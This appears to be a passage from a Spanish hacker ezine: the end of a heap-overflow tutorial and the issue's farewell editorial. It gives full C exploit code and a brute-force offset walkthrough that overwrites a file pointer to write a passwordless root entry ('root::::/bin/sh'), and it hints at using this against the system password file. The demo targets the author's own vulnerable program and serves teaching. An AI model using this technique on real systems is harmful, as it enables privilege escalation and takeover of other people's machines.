<++> heap/exploit2.c $cc2e106df958188984666213aa549c49
/* exploit para el programa ejemplo2.c
 * el original sigue estando en w00w00 ;)
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define BUFSIZE 256
#define ERROR -1

#define DIFF 16 

#define VULPROG "./ejemplo2"
#define VULFILE "/tmp/mierdapami" 

u_long getesp()
{
   __asm__("movl %esp,%eax"); 
}

int main(int argc, char **argv)
{
   u_long addr;

   register int i;
   int mainbufsize;

   char *mainbuf, buf[DIFF+6+1] = "+ +\t# ";

   memset(buf, 0, sizeof(buf)), strcpy(buf, "root::::/bin/sh\t    #");

   memset(buf + strlen(buf), 'A', DIFF);
   addr = getesp() + atoi(argv[1]);

   for (i = 0; i < sizeof(u_long); i++)
      buf[DIFF + i] = ((u_long)addr >> (i * 8) & 255);

   mainbufsize = strlen(buf) + strlen(VULPROG) +
         strlen(VULPROG) + strlen(VULFILE) + 13;

   mainbuf = (char *)malloc(mainbufsize);
   memset(mainbuf, 0, sizeof(mainbuf));

   snprintf(mainbuf, mainbufsize - 1, "echo '%s' | %s %s\n",
            buf, VULPROG, VULFILE);


   system(mainbuf);
   return 0;
}
<-->

Pues nada, aqui tenemos que un programa aparentemente inocente como este,
es capaz de escribir lo que nosotros queramos en cualquier sitio donde
tengamos privilegios de escritura. Solamente tenemos que ir probando
distintos offsets hasta que sobreescribamos la ruta completa:

[..]
cafo@thehost:~/nets/heap$ ./exploit2 500
antes del exploit: /tmp/mama.txt
Datos a introducir en mama.txt:

despues del exploit: G = spanish
[...]

ups, nos hemos ido a la zona de las variables de entorno (no decia yo que este
tipo de exploit puede ser realmente util? ;). Sigamos probando (esto mas o
menos es el juego del "hundir la flota" pero nosotros tenemos el truco de que
podemos probar millones de valores por minuto, no? :)

[...]
cafo@thehost:~/nets/heap$ ./exploit2 400
antes del exploit: /tmp/mama.txt
Datos a introducir en mama.txt:

despues del exploit: üÿ¿
[...]

Dish, nos hemos ido al codigo ejecutable. Demasiado bajo. Agua ;)

[...]
cafo@thehost:~/nets/heap$ ./exploit2 450
antes del exploit: /tmp/mama.txt
Datos a introducir en mama.txt:

despues del exploit: mplo2
[...]

esto ya suena mejor. Es el nombre del programa vulnerable, asi que suponemos
que podemos estar en argv[0], no?. Agua todavia.

[...]
cafo@thehost:~/nets/heap$ ./exploit2 465
antes del exploit: /tmp/mama.txt
Datos a introducir en mama.txt:

despues del exploit: dapami
[...]

bueno bueno bueno, esto ya esta mucho mejor. Acabamos de encontrar nuestra
cadena apuntando al fichero que queremos sobreescribir. TOCADO!. Contando
con los dedos resulta que

[...]
cafo@thehost:~/nets/heap$ ./exploit2 456
antes del exploit: /tmp/mama.txt
Datos a introducir en mama.txt:

despues del exploit: /tmp/mierdapami
[...]

HUNDIDO!!! Si todo ha salido bien, tenemos en nuestro directorio tmp ese
archivo con la info q nosotros queriamos que tuviese. Veamoslo: 

[...]
cafo@thehost:~/nets/heap$ cat /tmp/mierdapami
root::::/bin/sh
cafo@thehost:~/nets/heap
[...]

interesante, verdad? Que pena que esa misma linea no estuviera en otro sitio...
pero nada, como esto no es para que hagais cosas malas, os dejo que 
investigues vosotros.

Hasta aqui todo ha salido muy bien. Por supuesto que por ahora solo hemos 
estado con programas mios, es decir, que yo sabia al escribirlos que iban 
a ser vulnerables. Lo siguiente seria averiguar que tipo de programas
pueden ser vulnerables o que tipo de variables son tipicamentes sobreescritas
por los exploits, pero eso lo dejaremos para la segunda parte del arti ;)

un saludete.
cafo.



0x00

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_


=-[ 0x15 ]-==================================================================
=-[ NetSearch Ezine #4 ]-====================================================
=-[ Despedida ]-=============================================================
=-[ por Editor ]-============================================================




Pues nada, hasta aqui ha llegado este numero :). Nos hubiera gustado incluir
un par de cosillas mas, pero tampoco queriamos que el Ezine 'engordara'
demasiado, asi que las hemos reservado para NetSearch Ezine #5.. La fecha
del mismo sera aproximadamente dentro de 3 meses, es decir, asi a ojo a
finales de Marzo. No dejeis de visitar nuestra web para mas informacion,
http://www.netsearch-ezine.com.

Hasta entonces, un saludo a tod@s. Nos vemos en NS #5 ;).


El Editor



0x00 
